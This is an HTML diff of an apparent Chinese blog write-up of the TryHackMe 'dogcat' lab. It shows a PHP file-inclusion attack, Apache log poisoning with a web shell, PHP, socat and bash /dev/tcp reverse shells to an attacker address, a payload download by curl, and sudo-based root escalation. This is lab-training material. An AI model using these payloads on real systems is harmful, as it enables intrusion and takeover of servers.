@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>TryHackMe DogCat ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -113,14 +123,17 @@
         <div class="section">
           <div class="post_content">
               <h2 id="dogcat"><a href="#dogcat" class="headerlink" title="dogcat"></a>dogcat</h2><p>来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功能。</p>
-<pre><code>http://10.10.175.143/?view=dog
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140132214.png" alt="image-20200724140132214"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140132214.png" alt="image-20200724140132214"></p>
 <p>给参数来个单引号查看变化，发现报错，并且从报错上看，明显是文件读取拼接文件后缀名，所以此处可能存在一个文件读取漏洞。</p>
-<pre><code>http://10.10.175.143/?view=dog%27
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140621351.png" alt="image-20200724140621351"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog%27<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140621351.png" alt="image-20200724140621351"></p>
 <p>再尝试添加一个%00来截断后缀，发现没有后缀显示，应该是已经截断。</p>
-<pre><code>http://10.10.175.143/?view=dog%27%00
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140728518.png" alt="image-20200724140728518"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog%27%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140728518.png" alt="image-20200724140728518"></p>
 <p>尝试读取本地文件的时候发现只能读取dog和cat的文件，猜测可能是由于判断请求中是否含有相关字段</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724141429734.png" alt="image-20200724141429734"></p>
 <p>再%00后面添加dog字段发现可以绕过，说明是判断是否存在字符串，只不过发现读取文件的时候并不能正常读取。include_path在任何文件中都可以直接引入该目录下文件，被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找</p>
@@ -129,82 +142,92 @@
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724152733228.png" alt="image-20200724152733228"></p>
 <p>调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。</p>
 <p>利用php协议来读取文件，尝试php://filter，可以读取到文件内容</p>
-<pre><code>/?view=php://filter/read=convert.base64-encode/resource=dog/../index
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dog&#x2F;..&#x2F;index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p>
 <p>解码后index的内容为</p>
-<pre><code>&lt;!DOCTYPE HTML&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE HTML&gt;
 &lt;html&gt;
 
 &lt;head&gt;
-    &lt;title&gt;dogcat&lt;/title&gt;
-    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;
-&lt;/head&gt;
+    &lt;title&gt;dogcat&lt;&#x2F;title&gt;
+    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&#x2F;style.css&quot;&gt;
+&lt;&#x2F;head&gt;
 
 &lt;body&gt;
-    &lt;h1&gt;dogcat&lt;/h1&gt;
-    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;
+    &lt;h1&gt;dogcat&lt;&#x2F;h1&gt;
+    &lt;i&gt;a gallery of various dogs or cats&lt;&#x2F;i&gt;
 
     &lt;div&gt;
-        &lt;h2&gt;What would you like to see?&lt;/h2&gt;
-        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+        &lt;h2&gt;What would you like to see?&lt;&#x2F;h2&gt;
+        &lt;a href&#x3D;&quot;&#x2F;?view&#x3D;dog&quot;&gt;&lt;button id&#x3D;&quot;dog&quot;&gt;A dog&lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;?view&#x3D;cat&quot;&gt;&lt;button id&#x3D;&quot;cat&quot;&gt;A cat&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;
         &lt;?php
-            function containsStr($str, $substr) {
-                return strpos($str, $substr) !== false;
-            }
-        $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;
-            if(isset($_GET[&#39;view&#39;])) {
-                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
+            function containsStr($str, $substr) &#123;
+                return strpos($str, $substr) !&#x3D;&#x3D; false;
+            &#125;
+	    $ext &#x3D; isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;
+            if(isset($_GET[&#39;view&#39;])) &#123;
+                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) &#123;
                     echo &#39;Here you go!&#39;;
                     include $_GET[&#39;view&#39;] . $ext;
-                } else {
+                &#125; else &#123;
                     echo &#39;Sorry, only dogs or cats are allowed.&#39;;
-                }
-            }
+                &#125;
+            &#125;
         ?&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
+    &lt;&#x2F;div&gt;
+&lt;&#x2F;body&gt;
 
-&lt;/html&gt;
-</code></pre><p>存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。</p>
-<pre><code>/?view=/dog/../etc/&amp;ext=passwd
-/?view=/dog/../etc/passwd&amp;ext=
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153512101.png" alt="image-20200724153512101"></p>
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;etc&#x2F;&amp;ext&#x3D;passwd
+&#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;etc&#x2F;passwd&amp;ext&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153512101.png" alt="image-20200724153512101"></p>
 <p>然后现在需要考虑的就是如果把本地文件读取来获取rce。</p>
 <p>想试一下从<code>/proc/self/environ</code>来获取，发现文件没有权限，尝试别的目录，发现可以读取日志。</p>
-<pre><code>/?view=/dog/../var/log/apache2/access.log&amp;ext=&amp;aaa=&lt;?=phpinfo();?&gt;
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724155056684.png" alt="image-20200724155056684"></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&amp;ext&#x3D;&amp;aaa&#x3D;&lt;?&#x3D;phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724155056684.png" alt="image-20200724155056684"></p>
 <p>由于使用bp的时候编码和特殊符号会导致写入错误，所以使用curl写一句话</p>
-<pre><code>curl -v &quot;http://10.10.136.89/&lt;?php system($_GET\[&#39;cmd&#39;\]);?&gt;&quot;
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724173648127.png" alt="image-20200724173648127"></p>
+<pre class="line-numbers language-none"><code class="language-none">curl -v &quot;http:&#x2F;&#x2F;10.10.136.89&#x2F;&lt;?php system($_GET\[&#39;cmd&#39;\]);?&gt;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724173648127.png" alt="image-20200724173648127"></p>
 <p>反弹一个shell回来</p>
-<pre><code>php+-r+&#39;$sock=fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39;
-</code></pre><p>获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量</p>
+<pre class="line-numbers language-none"><code class="language-none">php+-r+&#39;$sock&#x3D;fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;&#x2F;bin&#x2F;sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727153957529.png" alt="image-20200727153957529"></p>
 <p>利用<code>sudo env /bin/bash</code>获取一个root权限</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727154232251.png" alt="image-20200727154232251"></p>
 <p>搜了一圈发现只有三个flag，flag4并不在，查了一下根目录发现<code>.dockerenv</code>，这是个docker环境，所以可能需要docker逃逸一下？</p>
 <p>先升级一个可交互的shell来操作，docker不带python环境和socat，所以先传一个socat上去。主机不带wget，使用curl</p>
-<pre><code>curl -o socat http://10.6.xx.xx:8000/socat
-</code></pre><p>再docker上执行</p>
-<pre><code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444
-</code></pre><p>在自己监听主机上执行</p>
-<pre><code>./socat file:`tty`,raw,echo=0 tcp-listen:4444
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p>
-<p>再试一手CVE-2016-5195，<a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></p>
+<pre class="line-numbers language-none"><code class="language-none">curl -o socat http:&#x2F;&#x2F;10.6.xx.xx:8000&#x2F;socat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>再docker上执行</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在自己监听主机上执行</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p>
+<p>再试一手CVE-2016-5195，<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p>
 <p>发现还是不行，查看一下系统上有没有可以利用的文件</p>
 <p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p>
-<pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.6.xx.xx/8855 0&gt;&amp;1&quot; &gt; /opt/backups/backup.sh
-</code></pre><p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>
+<pre class="line-numbers language-none"><code class="language-none">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.6.xx.xx&#x2F;8855 0&gt;&amp;1&quot; &gt; &#x2F;opt&#x2F;backups&#x2F;backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2020/07/TryHackMe-DogCat/">/2020/07/TryHackMe-DogCat/</a>
-                    <p>发表日期：<a href="/2020/07/TryHackMe-DogCat/">July 28th 2020, 4:57:08 pm</a>
-                    <p>更新日期：<a href="/2020/07/TryHackMe-DogCat/">July 28th 2020, 4:57:08 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2020/07/TryHackMe-DogCat/">https://misakikata.github.io/2020/07/TryHackMe-DogCat/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2020/07/TryHackMe-DogCat/">July 28th 2020, 4:57:08 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2020/07/TryHackMe-DogCat/">July 28th 2020, 4:57:08 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -239,7 +262,7 @@
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2020/07/TryHackMe-DogCat/'; 
+            this.page.url = 'https://misakikata.github.io/2020/07/TryHackMe-DogCat/'; 
             this.page.identifier = '/2020/07/TryHackMe-DogCat/';
         };
         (function() { 
@@ -250,7 +273,7 @@
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -270,16 +293,32 @@
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
